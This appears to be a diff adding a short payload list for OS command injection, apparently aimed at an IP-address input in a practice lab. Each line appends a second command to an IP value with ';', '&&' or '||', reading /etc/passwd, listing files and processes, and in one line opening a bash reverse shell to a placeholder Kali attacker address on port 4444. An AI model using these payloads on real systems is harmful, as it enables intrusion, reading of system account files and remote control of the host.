@@ -1,0 +1,12 @@
+192.168.47.92;ls 
+ 192.168.47.92; cat /etc/passwd  
+192.168.47.92; bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
+ip address ; ls 
+ ip address && whoami 
+ ip address || whoami 
+ ip address && ls /etc 
+ ip address && cat /etc/passwd 
+ ip address && ls -la 
+ ip address && ps aux 
+ ip address && ifconfig 
+ ip address && mkdir dvs 
